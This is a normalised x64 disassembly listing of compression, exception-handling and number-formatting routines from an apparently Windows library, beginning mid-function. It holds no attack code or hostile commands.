or [ r10 + 0x1708 ] ax
mov al [ r10 + 0x1708 ]
mov [ rdx + rcx ] al
inc [ r10 + 0x28 ]
movsxd rdx [ r10 + 0x28 ]
mov al [ r10 + 0x1709 ]
mov rcx [ r10 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r10 + 0x170c ]
inc [ r10 + 0x28 ]
mov ecx r11d
lea eax [ rdx + rsi - 0x10 ]
sub cl dl
shr r8w cl
mov [ r10 + 0x1708 ] r8w
jmp r-xdata
movzx eax [ rbx + rdx * 4 ]
shl ax cl
or [ r10 + 0x1708 ] ax
lea eax [ rcx + r9 ]
jmp r-xdata
movzx r8d [ rbx + rdx * 4 ]
movsxd rdx [ r10 + 0x28 ]
movzx eax r8w
shl ax cl
mov rcx [ r10 + 0x10 ]
or [ r10 + 0x1708 ] ax
mov al [ r10 + 0x1708 ]
mov [ rdx + rcx ] al
inc [ r10 + 0x28 ]
movsxd rdx [ r10 + 0x28 ]
mov al [ r10 + 0x1709 ]
mov rcx [ r10 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r10 + 0x170c ]
inc [ r10 + 0x28 ]
mov ecx r11d
lea eax [ rdx + r9 - 0x10 ]
sub cl dl
shr r8w cl
mov [ r10 + 0x1708 ] r8w
jmp r-xdata
dec r9d
cmp r9d 0x100
jae r-xdata
sub edi [ r15 + r12 * 4 + 0x1a6c0 ]
mov ecx eax
mov eax r11d
sub eax r8d
cmp ecx eax
jle r-xdata
mov [ r10 + 0x170c ] eax
mov r8d [ r15 + r12 * 4 + 0x19d50 ]
test r8d r8d
je r-xdata
mov [ r10 + 0x170c ] eax
mov eax r9d
shr eax 0x7
add eax 0x100
movzx ecx [ rax + r15 + 0x1a3c0 ]
movzx ecx [ r9 + r15 + 0x1a3c0 ]
jmp r-xdata
shl di cl
lea eax [ rcx + r8 ]
or [ r10 + 0x1708 ] di
movsxd rdx [ r10 + 0x28 ]
movzx eax di
shl ax cl
mov rcx [ r10 + 0x10 ]
or [ r10 + 0x1708 ] ax
mov al [ r10 + 0x1708 ]
mov [ rdx + rcx ] al
inc [ r10 + 0x28 ]
movsxd rdx [ r10 + 0x28 ]
mov al [ r10 + 0x1709 ]
mov rcx [ r10 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r10 + 0x170c ]
inc [ r10 + 0x28 ]
mov ecx r11d
lea eax [ rdx + r8 - 0x10 ]
sub cl dl
shr di cl
mov [ r10 + 0x1708 ] di
jmp r-xdata
mov rax [ r10 + 0x16f0 ]
mov ecx [ r10 + 0x170c ]
movzx r9d [ rax + r13 ]
mov rax [ r10 + 0x16e0 ]
add r13 0x2
movzx edi [ rbp + rax ]
inc ebp
test r9d r9d
jne r-xdata
movzx eax [ r14 + rdi * 4 ]
shl ax cl
or [ r10 + 0x1708 ] ax
lea eax [ rcx + rsi ]
movzx r8d [ r14 + rdi * 4 ]
movsxd rdx [ r10 + 0x28 ]
movzx eax r8w
shl ax cl
mov rcx [ r10 + 0x10 ]
or [ r10 + 0x1708 ] ax
mov al [ r10 + 0x1708 ]
mov [ rdx + rcx ] al
inc [ r10 + 0x28 ]
movsxd rdx [ r10 + 0x28 ]
mov al [ r10 + 0x1709 ]
mov rcx [ r10 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r10 + 0x170c ]
inc [ r10 + 0x28 ]
mov ecx r11d
lea eax [ rdx + rsi - 0x10 ]
sub cl dl
shr r8w cl
mov [ r10 + 0x1708 ] r8w
jmp r-xdata
movzx esi [ r14 + rcx * 4 + 0x2 ]
mov edi ecx
mov ecx [ r10 + 0x170c ]
mov eax r11d
sub eax esi
cmp ecx eax
jle r-xdata
mov [ r10 + 0x170c ] eax
cmp ebp [ r10 + 0x16ec ]
jb r-xdata
sub r9d [ r15 + rdi * 4 + 0x1a740 ]
mov ecx eax
mov eax r11d
sub eax r8d
cmp ecx eax
jle r-xdata
mov [ r10 + 0x170c ] eax
mov r8d [ r15 + rdi * 4 + 0x19dd0 ]
test r8d r8d
je r-xdata
shl r9w cl
lea eax [ rcx + r8 ]
or [ r10 + 0x1708 ] r9w
movsxd rdx [ r10 + 0x28 ]
movzx eax r9w
shl ax cl
mov rcx [ r10 + 0x10 ]
or [ r10 + 0x1708 ] ax
mov al [ r10 + 0x1708 ]
mov [ rdx + rcx ] al
inc [ r10 + 0x28 ]
movsxd rdx [ r10 + 0x28 ]
mov al [ r10 + 0x1709 ]
mov rcx [ r10 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r10 + 0x170c ]
inc [ r10 + 0x28 ]
mov ecx r11d
lea eax [ rdx + r8 - 0x10 ]
sub cl dl
shr r9w cl
mov [ r10 + 0x1708 ] r9w
jmp r-xdata
sub_1800107f0
mov eax [ rcx + 0x170c ]
xor r10d r10d
mov r9 rcx
cmp eax 0x8
jle r-xdata
test eax eax
jle r-xdata
movsxd r8 [ rcx + 0x28 ]
mov al [ rcx + 0x1708 ]
mov rdx [ rcx + 0x10 ]
mov [ r8 + rdx ] al
inc [ rcx + 0x28 ]
mov al [ rcx + 0x1709 ]
jmp r-xdata
mov [ r9 + 0x1708 ] r10w
mov [ r9 + 0x170c ] r10d
retn
mov al [ r9 + 0x1708 ]
movsxd rdx [ rcx + 0x28 ]
mov rcx [ rcx + 0x10 ]
mov [ rdx + rcx ] al
inc [ r9 + 0x28 ]
sub_180010848
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov rax [ rdx + 0x10 ]
mov rsi [ rdx ]
xor r15d r15d
movsxd r12 [ rax + 0x14 ]
mov r9 [ rax ]
or ebp 0xffffffff
mov rdi rcx
mov [ rcx + 0x1494 ] r15d
mov [ rcx + 0x1498 ] 0x23d
mov r13 rdx
mov r8d r15d
mov ecx r15d
lea r14d [ rbp + 0x2 ]
test r12d r12d
jle r-xdata
cmp [ rdi + 0x1494 ] 0x2
jl r-xdata
cmp [ rsi + rcx * 4 ] r15w
je r-xdata
cmp ebp 0x2
jge r-xdata
mov [ rdx + 0x8 ] ebp
mov eax [ rdi + 0x1494 ]
cdq
sub eax edx
sar eax 0x1
mov ebx eax
cmp eax r14d
jl r-xdata
mov [ rsi + rcx * 4 + 0x2 ] r15w
add [ rdi + 0x1494 ] r14d
movsxd rax [ rdi + 0x1494 ]
mov ebp r8d
mov [ rdi + rax * 4 + 0xba0 ] r8d
mov [ rcx + rdi + 0x149c ] r15b
jmp r-xdata
mov ecx r15d
add ebp r14d
mov ecx ebp
jmp r-xdata
movsxd rdx [ rdi + 0x1494 ]
movsxd rbx [ rdi + 0xba4 ]
mov r8d r14d
mov ecx [ rdi + rdx * 4 + 0xba0 ]
lea eax [ rdx - 0x1 ]
mov rdx rsi
mov [ rdi + 0xba4 ] ecx
mov rcx rdi
mov [ rdi + 0x1494 ] eax
call sub_18000f844
dec [ rdi + 0x1498 ]
movsxd rcx [ rdi + 0xba4 ]
movsxd rax [ rdi + 0x1498 ]
movsxd r9 r12d
mov rdx rcx
mov [ rdi + rax * 4 + 0xba0 ] ebx
dec [ rdi + 0x1498 ]
movsxd rax [ rdi + 0x1498 ]
mov [ rdi + rax * 4 + 0xba0 ] ecx
movzx eax [ rsi + rcx * 4 ]
add ax [ rsi + rbx * 4 ]
mov [ rsi + r9 * 4 ] ax
mov al [ rbx + rdi + 0x149c ]
mov cl [ rcx + rdi + 0x149c ]
cmp al cl
movzx eax al
jae r-xdata
mov r8d ebx
mov rdx rsi
mov rcx rdi
call sub_18000f844
sub ebx r14d
cmp ebx r14d
jge r-xdata
jmp r-xdata
add rcx r14
add r8d r14d
cmp rcx r12
jl r-xdata
movzx eax [ r9 + rax * 4 + 0x2 ]
sub [ rdi + 0x16fc ] eax
add [ rdi + 0x1494 ] r14d
movsxd rax [ rdi + 0x1494 ]
mov [ rdi + rax * 4 + 0xba0 ] ecx
movsxd rax ecx
mov [ rsi + rax * 4 ] r14w
mov [ rax + rdi + 0x149c ] r15b
dec [ rdi + 0x16f8 ]
test r9 r9
je r-xdata
add al r14b
mov r8d r14d
mov rcx rdi
mov [ r9 + rdi + 0x149c ] al
mov [ rsi + rdx * 4 + 0x2 ] r12w
mov [ rsi + rbx * 4 + 0x2 ] r12w
mov [ rdi + 0xba4 ] r12d
mov rdx rsi
add r12d r14d
call sub_18000f844
cmp [ rdi + 0x1494 ] 0x2
jge r-xdata
movzx eax cl
dec [ rdi + 0x1498 ]
movsxd rcx [ rdi + 0x1498 ]
mov eax [ rdi + 0xba4 ]
mov [ rdi + rcx * 4 + 0xba0 ] eax
mov rdx r13
mov rcx rdi
call sub_18000f8f8
lea rax [ rsp + 0x22 ]
movzx r8d r15w
sub rdi rax
mov rdx r14
lea rax [ rdi + rdx * 2 + 0xb80 ]
add r8w [ rsp + rax + 0x20 ]
add r8w r8w
mov [ rsp + rdx * 2 + 0x20 ] r8w
add rdx r14
cmp rdx 0xf
jle r-xdata
mov rdx r15
movsxd r10 ebp
test ebp ebp
js r-xdata
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
movzx r8d [ rsi + rdx * 4 + 0x2 ]
test r8d r8d
je r-xdata
add rdx r14
cmp rdx r10
jle r-xdata
movzx r9d [ rsp + r8 * 2 + 0x20 ]
mov ecx r15d
lea eax [ r14 + r9 ]
mov [ rsp + r8 * 2 + 0x20 ] ax
mov eax r9d
sub r8d r14d
shr r9d 0x1
and eax r14d
or ecx eax
add ecx ecx
test r8d r8d
jg r-xdata
shr ecx 0x1
mov [ rsi + rdx * 4 ] cx
sub_180010ae4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov r11 rcx
mov ecx [ rcx + 0x170c ]
mov ebx r8d
mov rdi rdx
cmp ecx 0xd
jle r-xdata
shl r9w cl
lea eax [ rcx + 0x3 ]
or [ r11 + 0x1708 ] r9w
movsxd rdx [ r11 + 0x28 ]
movzx eax r9w
shl ax cl
mov rcx [ r11 + 0x10 ]
or [ r11 + 0x1708 ] ax
mov al [ r11 + 0x1708 ]
mov [ rdx + rcx ] al
inc [ r11 + 0x28 ]
movsxd rdx [ r11 + 0x28 ]
mov al [ r11 + 0x1709 ]
mov rcx [ r11 + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ r11 + 0x170c ]
inc [ r11 + 0x28 ]
mov ecx 0x10
lea eax [ rdx - 0xd ]
sub cl dl
shr r9w cl
mov [ r11 + 0x1708 ] r9w
jmp r-xdata
mov eax [ r11 + 0x28 ]
jne r-xdata
mov rcx r11
mov [ r11 + 0x170c ] eax
call sub_1800107f0
movsxd rcx [ r11 + 0x28 ]
mov rax [ r11 + 0x10 ]
mov [ r11 + 0x1704 ] 0x8
mov [ rcx + rax ] bl
inc [ r11 + 0x28 ]
movsxd rcx [ r11 + 0x28 ]
mov rax [ r11 + 0x10 ]
movzx edx bx
shr dx 0x8
mov [ rcx + rax ] dl
inc [ r11 + 0x28 ]
movsxd rcx [ r11 + 0x28 ]
mov rax [ r11 + 0x10 ]
mov dl bl
not dl
mov [ rcx + rax ] dl
inc [ r11 + 0x28 ]
movsxd rcx [ r11 + 0x28 ]
mov rax [ r11 + 0x10 ]
movzx edx bx
not dx
shr dx 0x8
mov [ rcx + rax ] dl
inc [ r11 + 0x28 ]
test ebx ebx
jmp r-xdata
mov rcx [ r11 + 0x10 ]
movsxd rdx eax
mov al [ rdi ]
mov [ rdx + rcx ] al
inc [ r11 + 0x28 ]
inc rdi
dec ebx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180010c00
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r13
push r14
sub rsp 0x20
xor r13d r13d
mov edi r9d
mov esi r8d
mov rbp rdx
mov rbx rcx
lea r14d [ r13 + 0x4 ]
mov r10d r13d
cmp [ rcx + 0xa4 ] r13d
jle r-xdata
lea ecx [ r8 + 0x5 ]
cmp [ rcx + 0x30 ] 0x2
jne r-xdata
cmp ecx edx
mov ecx [ rbx + 0x170c ]
jne r-xdata
test rbp rbp
je r-xdata
lea rdx [ rbx + 0xb38 ]
mov rcx rbx
call sub_180010848
lea rdx [ rbx + 0xb50 ]
mov rcx rbx
call sub_180010848
mov r8d [ rbx + 0xb40 ]
lea rdx [ rbx + 0xb4 ]
mov rcx rbx
call sub_18000faf0
mov r8d [ rbx + 0xb58 ]
lea rdx [ rbx + 0x9a8 ]
mov rcx rbx
call sub_18000faf0
lea rdx [ rbx + 0xb68 ]
mov rcx rbx
call sub_180010848
mov r10d 0x12
mov ecx r10d
mov ecx r13d
mov edx r13d
lea r8 [ rbx + 0xb4 ]
lea r9d [ r13 + 0x7 ]
cmp ecx 0xd
jle r-xdata
cmp ecx 0xd
jle r-xdata
mov r9d edi
mov r8d esi
mov rdx rbp
mov rcx rbx
call sub_180010ae4
jmp r-xdata
mov ecx [ rbx + 0x16fc ]
lea eax [ r10 + r10 * 2 + 0x11 ]
add [ rbx + 0x16f8 ] eax
mov edx [ rbx + 0x16f8 ]
add ecx 0xa
add edx 0xa
shr ecx 0x3
shr edx 0x3
cmp ecx edx
ja r-xdata
dec rcx
dec r10d
cmp rcx 0x3
jge r-xdata
movzx eax [ r8 ]
add r8 r14
add edx eax
dec r9
jne r-xdata
lea r8 [ rbx + 0xd0 ]
mov r9d 0x79
lea eax [ r14 + rdi ]
shl ax cl
or [ rbx + 0x1708 ] ax
lea eax [ rcx + 0x3 ]
movsxd rdx [ rbx + 0x28 ]
lea r8d [ rdi + 0x4 ]
movzx eax r8w
shl ax cl
mov rcx [ rbx + 0x10 ]
or [ rbx + 0x1708 ] ax
mov al [ rbx + 0x1708 ]
mov [ rdx + rcx ] al
inc [ rbx + 0x28 ]
movsxd rdx [ rbx + 0x28 ]
mov al [ rbx + 0x1709 ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ rbx + 0x170c ]
inc [ rbx + 0x28 ]
mov ecx 0x10
lea eax [ rdx - 0xd ]
sub cl dl
shr r8w cl
mov [ rbx + 0x1708 ] r8w
jmp r-xdata
lea eax [ rdi + 0x2 ]
shl ax cl
or [ rbx + 0x1708 ] ax
lea eax [ rcx + 0x3 ]
movsxd rdx [ rbx + 0x28 ]
lea r8d [ rdi + 0x2 ]
movzx eax r8w
shl ax cl
mov rcx [ rbx + 0x10 ]
or [ rbx + 0x1708 ] ax
mov al [ rbx + 0x1708 ]
mov [ rdx + rcx ] al
inc [ rbx + 0x28 ]
movsxd rdx [ rbx + 0x28 ]
mov al [ rbx + 0x1709 ]
mov rcx [ rbx + 0x10 ]
mov [ rdx + rcx ] al
mov edx [ rbx + 0x170c ]
inc [ rbx + 0x28 ]
mov ecx 0x10
lea eax [ rdx - 0xd ]
sub cl dl
shr r8w cl
mov [ rbx + 0x1708 ] r8w
jmp r-xdata
mov rcx rbx
call sub_18000f7d4
test edi edi
je r-xdata
lea eax [ rsi + 0x4 ]
cmp eax edx
ja r-xdata
jmp r-xdata
lea rax [ r--data ]
movzx eax [ rcx + rax ]
cmp [ rbx + rax * 4 + 0xa9e ] r13w
jne r-xdata
movzx eax [ r8 ]
add r8 r14
add ecx eax
dec r9
jne r-xdata
lea r8 [ rbx + 0x2b4 ]
mov r9d 0x80
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r14
pop r13
pop rdi
retn
call sub_1800107f0
mov r8d [ rbx + 0xb58 ]
mov edx [ rbx + 0xb40 ]
lea r9d [ r10 + 0x1 ]
inc r8d
inc edx
mov rcx rbx
mov [ rbx + 0x170c ] eax
call sub_180010134
lea r8 [ rbx + 0x9a8 ]
lea rdx [ rbx + 0xb4 ]
mov rcx rbx
call sub_1800103a8
mov [ rbx + 0x170c ] eax
lea r8 [ r--data ]
lea rdx [ r--data ]
jmp r-xdata
mov edx ecx
movzx eax [ r8 ]
add r8 r14
add edx eax
dec r9
jne r-xdata
shr ecx 0x2
cmp edx ecx
setbe al
mov [ rbx + 0x30 ] al
sub_180010edc
lea rax [ sub_1800117fc ]
lea rcx [ sub_18001234c ]
mov [ rw-data ] rax
lea rax [ sub_1800117ec ]
mov [ rw-data ] rcx
mov [ rw-data ] rax
lea rax [ sub_1800117f4 ]
mov [ rw-data ] rcx
mov [ rw-data ] rax
lea rax [ sub_180011790 ]
mov [ rw-data ] rax
lea rax [ sub_1800122b4 ]
mov [ rw-data ] rax
lea rax [ sub_1800117a8 ]
mov [ rw-data ] rax
lea rax [ sub_1800116f0 ]
mov [ rw-data ] rax
lea rax [ sub_180011670 ]
mov [ rw-data ] rax
retn
sub_180010f6c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rbx [ r9 + 0x38 ]
mov rsi rdx
mov r12 r8
mov rbp rcx
lea r8 [ rbx + 0x4 ]
mov rdx r9
mov rcx rsi
mov rdi r9
call sub_180009d8c
mov r11d [ rbx + 0x4 ]
mov r10d [ rbp + 0x4 ]
mov eax r11d
and r11d 0x2
mov r8d 0x1
and eax r8d
and r10b 0x66
cmove r11d eax
test r11d r11d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov eax r8d
add rsp 0x20
pop r12
retn
mov r9 rdi
mov r8 r12
mov rdx rsi
mov rcx rbp
call sub_1800111fc
mov r8d eax
sub_180010ffc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
movsxd rdi [ r8 + 0xc ]
mov r15 rcx
mov rcx r8
mov rbp r9
mov r13 r8
mov r14 rdx
call sub_1800123fc
mov r10 [ r15 ]
mov [ rbp ] r10
mov r12d eax
test edi edi
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
mov rax rbp
mov rbp [ rsp + 0x60 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rcx [ rdi + rdi * 4 ]
lea rsi [ rcx * 4 - 0x14 ]
sub rsi 0x14
dec edi
je r-xdata
cmp r12d [ rbx + 0x8 ]
jg r-xdata
jmp r-xdata
mov rcx [ r14 ]
lea rdx [ rsp + 0x50 ]
xor r8d r8d
call RtlLookupFunctionEntry
movsxd r8 [ rbx + 0x10 ]
mov r9d [ rbx + 0xc ]
add r8 [ rsp + 0x50 ]
mov r10d [ rax ]
xor ecx ecx
test r9d r9d
je r-xdata
movsxd rbx [ r13 + 0x10 ]
add rbx [ r14 + 0x8 ]
add rbx rsi
cmp r12d [ rbx + 0x4 ]
jle r-xdata
cmp ecx r9d
jb r-xdata
lea rdx [ r8 + 0xc ]
mov rax [ r15 ]
lea rcx [ rcx + rcx * 4 ]
movsxd rcx [ r8 + rcx * 4 + 0x10 ]
mov rcx [ rcx + rax ]
mov [ rbp ] rcx
inc ecx
add rdx 0x14
cmp ecx r9d
jb r-xdata
movsxd rax [ rdx ]
cmp rax r10
je r-xdata
sub_180011150
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
lea r9 [ rax + 0x18 ]
mov rbp r8
mov r12 rdx
call sub_180010ffc
mov rdx r12
mov rcx rbp
mov r13 rax
call sub_1800123fc
movsxd rdi [ rbp + 0xc ]
mov esi eax
test edi edi
je r-xdata
xor edx edx
lea rcx [ rdi + rdi * 4 ]
lea rbx [ rcx * 4 - 0x14 ]
mov r9d [ rdx + 0x4 ]
or r9d 0xffffffff
jmp r-xdata
sub rbx 0x14
dec edi
jne r-xdata
cmp esi [ rdx + 0x8 ]
jle r-xdata
mov r8 rbp
mov rdx r12
mov rcx r13
call sub_180012664
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
call sub_180007a4c
movsxd rcx [ rbp + 0x10 ]
mov rdx [ rax + 0x128 ]
add rdx rcx
add rdx rbx
cmp esi [ rdx + 0x4 ]
jle r-xdata
test rdx rdx
jne r-xdata
sub_1800111fc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rbx r9
mov rdi r8
mov rsi rcx
mov [ rsp + 0x50 ] rdx
call sub_180007a4c
mov rdx [ rbx + 0x8 ]
mov [ rax + 0x128 ] rdx
call sub_180007a4c
mov rdx [ rsi + 0x38 ]
mov [ rax + 0x130 ] rdx
call sub_180007a4c
mov rdx [ rbx + 0x38 ]
mov r8d [ rdx ]
lea rdx [ rsp + 0x50 ]
mov r9 rbx
add r8 [ rax + 0x128 ]
xor eax eax
mov rcx rsi
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r8
mov r8 rdi
call sub_1800135e4
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
sub_180011284
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rsi r9
mov rbp r8
mov rbx rdx
mov rdi rcx
call sub_180007a4c
mov [ rax + 0x138 ] rbx
mov rbx [ rdi ]
call sub_180007a4c
mov rdx [ rbx + 0x38 ]
mov rcx [ rsp + 0x78 ]
mov r9 [ rsp + 0x70 ]
mov [ rsp + 0x38 ] 0x1
mov [ rax + 0x130 ] rdx
xor ebx ebx
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rcx
mov rcx [ rdi ]
mov r8 rsi
mov rdx rbp
call sub_1800135e4
call sub_180007a4c
mov rcx [ rsp + 0x80 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov [ rax + 0x138 ] rbx
lea eax [ rbx + 0x1 ]
mov rbx [ rsp + 0x50 ]
mov [ rcx ] 0x1
add rsp 0x40
pop rdi
retn
sub_180011328
mov rax rsp
mov [ rax + 0x20 ] r9
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
mov [ rax + 0x8 ] rcx
push rbx
sub rsp 0x60
mov rbx rcx
and [ rax - 0x28 ] 0x0
mov [ rax - 0x20 ] rcx
mov [ rax - 0x18 ] r8
call sub_180007a4c
mov r8 [ rax + 0xe0 ]
lea rdx [ rsp + 0x48 ]
mov ecx [ rbx ]
call r8
mov [ rsp + 0x40 ] 0x0
jmp r-xdata
mov eax [ rsp + 0x40 ]
add rsp 0x60
pop rbx
retn
sub_18001137c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
movsxd rbx [ rdx + 0xc ]
mov r12 [ rsp + 0x70 ]
mov rdi rdx
mov rcx rdi
mov rdx r12
mov r13d r9d
xor ebp ebp
call sub_1800123fc
mov esi eax
test ebx ebx
jne r-xdata
mov r10 [ rsp + 0x68 ]
mov r8 [ rsp + 0x60 ]
or r11d 0xffffffff
mov [ r10 ] r11d
mov edx ebx
mov [ r8 ] r11d
test ebx ebx
je r-xdata
call sub_18000db64
test edx edx
je r-xdata
movsxd rcx [ rdi + 0x10 ]
lea rax [ rbx + rbx * 4 ]
lea rcx [ rcx + rax * 4 ]
mov rax [ r12 + 0x8 ]
lea r9 [ rcx + rax - 0xc ]
xor edx edx
test ebx ebx
je r-xdata
lea eax [ rdx - 0x1 ]
lea rdx [ rax + rax * 4 ]
movsxd rax [ rdi + 0x10 ]
lea rbp [ rax + rdx * 4 ]
add rbp [ r12 + 0x8 ]
sub r9 0x14
add edx r11d
jne r-xdata
cmp esi [ r9 ]
jle r-xdata
and [ r8 ] 0x0
and [ r10 ] 0x0
xor eax eax
xor r9d r9d
cmp esi [ r9 - 0x4 ]
jle r-xdata
cmp r13d [ rcx ]
jl r-xdata
mov eax [ rbp + 0x4 ]
cmp [ rcx ] eax
jle r-xdata
inc edx
add r9 0x14
cmp edx ebx
jb r-xdata
cmp r13d [ rcx + 0x4 ]
jg r-xdata
mov eax [ rbp + 0x8 ]
cmp [ rcx + 0x4 ] eax
jg r-xdata
movsxd rcx [ rdi + 0x10 ]
add rcx [ r12 + 0x8 ]
add rcx r9
test rbp rbp
je r-xdata
cmp [ r8 ] r11d
je r-xdata
mov eax [ r8 ]
cmp eax r11d
cmove eax edx
mov [ r8 ] eax
lea eax [ rdx + 0x1 ]
mov [ r10 ] eax
mov eax [ r8 ]
lea rcx [ rax + rax * 4 ]
movsxd rax [ rdi + 0x10 ]
lea rax [ rax + rcx * 4 ]
add rax [ r12 + 0x8 ]
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_1800114a8
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx ] rdx
call sub_180007a4c
cmp rbx [ rax + 0x120 ]
jae r-xdata
xor ecx ecx
call sub_180007a4c
mov rcx [ rax + 0x120 ]
jmp r-xdata
mov [ rbx + 0x8 ] rcx
call sub_180007a4c
mov [ rax + 0x120 ] rbx
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_1800114ec
push rbx
sub rsp 0x20
mov rbx rcx
call sub_180007a4c
mov rdx [ rax + 0x120 ]
jmp r-xdata
test rdx rdx
jne r-xdata
cmp [ rdx ] rbx
je r-xdata
lea eax [ rdx + 0x1 ]
xor eax eax
jmp r-xdata
mov rdx [ rdx + 0x8 ]
add rsp 0x20
pop rbx
retn
sub_180011520
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
call sub_180007a4c
cmp rdi [ rax + 0x120 ]
je r-xdata
call sub_180007a4c
mov rbx [ rax + 0x120 ]
jmp r-xdata
call sub_18000db64
test rbx rbx
jne r-xdata
cmp rdi rbx
je r-xdata
call sub_18000db64
call sub_180007a4c
mov rcx [ rbx + 0x8 ]
mov [ rax + 0x120 ] rcx
jmp r-xdata
mov rbx [ rbx + 0x8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180011580
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x4b8 ]
sub rsp 0x5b8
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4a0 ] rax
mov rbx [ rbp + 0x520 ]
mov rdi [ rbp + 0x530 ]
mov r14 [ rbp + 0x538 ]
mov r13 rdx
mov r15 rcx
mov r12 r8
lea rcx [ rsp + 0x30 ]
lea rdx [ r--data ]
mov r8d 0x98
mov rsi r9
call sub_180006a70
movsxd rax [ rbp + 0x528 ]
mov rdx [ r14 ]
mov rcx [ r15 ]
mov [ rsp + 0x68 ] rax
movzx eax [ rbp + 0x540 ]
lea r11 [ sub_18001292c ]
lea r8 [ rsp + 0x30 ]
mov [ rbp - 0x78 ] rax
mov rax [ r14 + 0x40 ]
xor r9d r9d
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x30 ]
mov [ rsp + 0x50 ] r11
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x70 ] r12
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x78 ] rdi
mov [ rbp - 0x80 ] r13
mov [ rbp - 0x70 ] 0x19930520
call RtlUnwindEx
mov rcx [ rbp + 0x4a0 ]
xor rcx rsp
call sub_180006220
add rsp 0x5b8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
sub_180011670
push rbx
sub rsp 0x40
mov rbx rcx
lea rcx [ rsp + 0x20 ]
call sub_18000643c
movsx ecx [ rbx ]
call sub_180007710
cmp eax 0x65
je r-xdata
movsx ecx [ rbx ]
call sub_180007710
cmp eax 0x78
jne r-xdata
inc rbx
movzx ecx [ rbx ]
call sub_18001380c
test eax eax
jne r-xdata
mov rax [ rsp + 0x20 ]
mov dl [ rbx ]
mov rcx [ rax + 0x128 ]
mov rax [ rcx ]
mov cl [ rax ]
mov [ rbx ] cl
inc rbx
add rbx 0x2
mov al [ rbx ]
mov [ rbx ] dl
mov dl al
mov al [ rbx ]
inc rbx
test al al
jne r-xdata
cmp [ rsp + 0x38 ] al
je r-xdata
add rsp 0x40
pop rbx
retn
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_1800116f0
push rbx
sub rsp 0x40
mov rbx rcx
lea rcx [ rsp + 0x20 ]
call sub_18000643c
mov r11b [ rbx ]
mov rcx [ rsp + 0x20 ]
test r11b r11b
je r-xdata
mov al [ rbx ]
inc rbx
test al al
je r-xdata
mov rax [ rcx + 0x128 ]
mov rdx [ rax ]
mov al [ rdx ]
cmp [ rsp + 0x38 ] 0x0
je r-xdata
jmp r-xdata
inc rbx
mov r11b [ rbx ]
test r11b r11b
jne r-xdata
add rsp 0x40
pop rbx
retn
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
mov al [ rbx ]
test al al
jne r-xdata
cmp r11b al
je r-xdata
cmp al 0x65
je r-xdata
mov rdx rbx
cmp al 0x45
je r-xdata
